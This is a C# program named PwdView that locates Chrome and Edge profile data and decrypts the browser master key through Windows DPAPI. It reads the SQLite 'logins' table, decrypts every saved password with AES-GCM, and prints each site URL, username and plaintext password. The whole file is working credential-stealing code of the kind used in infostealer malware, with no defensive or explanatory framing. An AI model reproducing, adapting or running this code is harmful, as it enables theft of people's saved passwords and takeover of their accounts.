using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;

namespace PwdView
{
    class Program
    {
        public static string local = Environment.GetEnvironmentVariable("localappdata");
        public static string temp = Environment.GetEnvironmentVariable("temp");

        static void Main(string[] args)
        {
            string[] chromeBrowsers = new string[]
            {
                Path.Combine(local, @"Google\Chrome\User Data"),
                Path.Combine(local, @"Microsoft\Edge\User Data")
            };

            foreach (var browser in chromeBrowsers)
            {
                if (!Directory.Exists(browser))
                    continue;

                string localState = SearchFiles(browser, "Local State")[0];
                byte[] masterKey = GetMasterKey(localState);

                if (masterKey == null)
                    continue;

                foreach (var loginData in SearchFiles(browser, "Login Data"))
                    GetLogins(loginData, masterKey);


            }

            Console.Read();
        }


        public static void GetLogins(string loginData, byte[] masterKey)
        {

            string randomPath = Path.Combine(temp, Path.GetRandomFileName());
            File.Copy(loginData, randomPath);

            SqlLite3Parser parser = new SqlLite3Parser(File.ReadAllBytes(randomPath));
            parser.ReadTable("logins");

            for (int i = 0; i < parser.GetRowCount(); i++)
            {
                byte[] password_buffer = parser.GetValue<byte[]>(i, "password_value");
                string username = parser.GetValue<string>(i, "username_value");
                string url = parser.GetValue<string>(i, "origin_url");

                if (password_buffer == null || username == null || url == null)
                {
                    continue;
                }

                string password = Encoding.Default.GetString(DecryptWithKey(password_buffer, masterKey));

                Console.WriteLine("URL       : {0}", url);
                Console.WriteLine("Username  : {0}", username);
                Console.WriteLine("Password  : {0}", password);
                Console.WriteLine();

            }

        }

        public static List<string> SearchFiles(string path, string pattern)
        {
            var foundFiles = new HashSet<string>();

            try
            {
                var files = Directory.GetFiles(path, pattern, SearchOption.TopDirectoryOnly);
                foreach (var file in files)
                    foundFiles.Add(file);

                var directories = Directory.GetDirectories(path);
                foreach (var directory in directories)
                {
                    try
                    {
                        var subDirFiles = SearchFiles(directory, pattern);
                        foreach (var file in subDirFiles)
                            foundFiles.Add(file);

                    }
                    catch
                    {
                        continue;
                    }
                }
            }
            catch
            { }

            return foundFiles.ToList();
        }

        public static byte[] GetMasterKey(string path)
        {
            try
            {
                string randomPath = Path.Combine(temp, Path.GetRandomFileName());
                File.Copy(path, randomPath);
                string file = File.ReadAllText(randomPath);

                string pattern = @"""encrypted_key"":""([^""]+)""";

                Regex regex = new Regex(pattern);
                Match match = regex.Match(file);

                byte[] masterKey = Convert.FromBase64String(match.Groups[1].Value);

                byte[] rawMasterKey = new byte[masterKey.Length - 5];
                Array.Copy(masterKey, 5, rawMasterKey, 0, masterKey.Length - 5);
                byte[] decryptedData = ProtectedData.Unprotect(rawMasterKey, null, DataProtectionScope.CurrentUser);

                return decryptedData;
            }
            catch
            { }

            return null;

        }

        public static byte[] DecryptWithKey(byte[] encryptedData, byte[] masterKey)
        {
            try
            {
                byte[] bIV = new byte[] { 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 };
                Array.Copy(encryptedData, 3, bIV, 0, 12);
                byte[] buffer = new byte[encryptedData.Length - 15];
                Array.Copy(encryptedData, 15, buffer, 0, encryptedData.Length - 15);

                byte[] tag = new byte[16];
                byte[] data = new byte[buffer.Length - tag.Length];

                Array.Copy(buffer, buffer.Length - 16, tag, 0, 16);
                Array.Copy(buffer, 0, data, 0, buffer.Length - tag.Length);
                AesGcm decryptor = new AesGcm();

                return decryptor.Decrypt(masterKey, bIV, null, data, tag);
            }
            catch
            { }

            return null;

        }


    }
}
